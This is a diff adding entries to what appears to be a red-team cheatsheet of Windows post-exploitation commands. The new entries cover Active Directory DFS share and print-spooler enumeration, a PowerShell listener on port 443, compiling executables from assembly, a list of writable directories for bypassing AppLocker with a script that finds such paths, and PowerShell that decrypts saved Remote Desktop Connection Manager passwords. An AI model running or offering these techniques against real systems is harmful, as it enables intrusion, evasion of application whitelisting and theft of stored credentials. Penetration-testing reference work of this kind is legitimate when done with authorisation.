@@ -163,6 +163,30 @@ klist tgt
 
 # whoami on older Windows systems
 set u
+
+# find DFS shares with ADModule
+Get-ADObject -filter * -SearchBase "CN=Dfs-Configuration,CN=System,DC=offense,DC=local" | select name
+
+# find DFS shares with ADSI
+$s=[adsisearcher]'(name=*)'; $s.SearchRoot = [adsi]"LDAP://CN=Dfs-Configuration,CN=System,DC=offense,DC=local"; $s.FindAll() | % {$_.properties.name}
+
+# check if spooler service is running on a host
+powershell ls "\\dc01\pipe\spoolss"
+```
+
+### Listen on a port \(Powershell\)
+
+```csharp
+# Start listener on port 443
+$listener = [System.Net.Sockets.TcpListener]443; $listener.Start();
+ 
+while($true)
+{
+    $client = $listener.AcceptTcpClient();
+    Write-Host $client.client.RemoteEndPoint "connected!";
+    $client.Close();
+    start-sleep -seconds 1;
+}
 ```
 
 ## Gaining Access
@@ -353,6 +377,16 @@ i686-w64-mingw32-gcc source.c -lws2_32 -o out.exe
 gcc -m32|-m64 -o output source.c
 ```
 
+### Compiling Assembly from Windows
+
+```text
+# https://www.nasm.us/pub/nasm/releasebuilds/?C=M;O=D
+nasm -f win64 .\hello.asm -o .\hello.obj
+
+# http://www.godevtool.com/Golink.zip
+GoLink.exe -o .\hello.exe .\hello.obj
+```
+
 ### Local File Inclusion to Shell
 
 ```bash
@@ -452,6 +486,45 @@ __import__('os').system('id')
 Get-AppLockerPolicy -Local).RuleCollections
 Get-ChildItem -Path HKLM:Software\Policies\Microsoft\Windows\SrpV2 -Recurse
 reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe\
+```
+
+### Applocker: Writable Windows Directories
+
+```text
+# list from https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
+C:\Windows\Tasks
+C:\Windows\Temp
+C:\windows\tracing
+C:\Windows\Registration\CRMLog
+C:\Windows\System32\FxsTmp
+C:\Windows\System32\com\dmp
+C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+C:\Windows\System32\spool\PRINTERS
+C:\Windows\System32\spool\SERVERS
+C:\Windows\System32\spool\drivers\color
+C:\Windows\System32\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\System32\Tasks_Migrated (after peforming a version upgrade of Windows 10)
+C:\Windows\SysWOW64\FxsTmp
+C:\Windows\SysWOW64\com\dmp
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\SyncCenter
+C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
+```
+
+### Find Writable Files/Folders in Windows
+
+```csharp
+$a = Get-ChildItem "c:\windows\" -recurse -ErrorAction SilentlyContinue
+$a | % {
+    $fileName = $_.fullname
+    $acls = get-acl $fileName  -ErrorAction SilentlyContinue | select -exp access | ? {$_.filesystemrights -match "full|modify|write" -and $_.identityreference -match "authenticated users|everyone|$env:username"}
+    if($acls -ne $null)
+    {
+        [pscustomobject]@{
+            filename = $fileName
+            user = $acls | select -exp identityreference
+        }
+    }
+}
 ```
 
 ### Check if Powershell Logging is Enabled
@@ -930,6 +1003,17 @@ find /etc -iname *.conf
 
 ```bash
 hivesh /registry/file
+```
+
+### Decrypting RDG Passwords
+
+Remote Desktop Connection Manager passwords can be decrypted on the same computer/account they were encrypted:
+
+```aspnet
+Copy-Item 'C:\Program Files (x86)\Microsoft\Remote Desktop Connection Manager\RDCMan.exe C:\temp\RDCMan.dll’
+Import-Module C:\temp\RDCMan.dll
+$EncryptionSettings = New-Object -TypeName RdcMan.EncryptionSettings
+[RdcMan.Encryption]::DecryptString($PwdString, $EncryptionSettings)
 ```
 
 ### Decrypting VNC Password
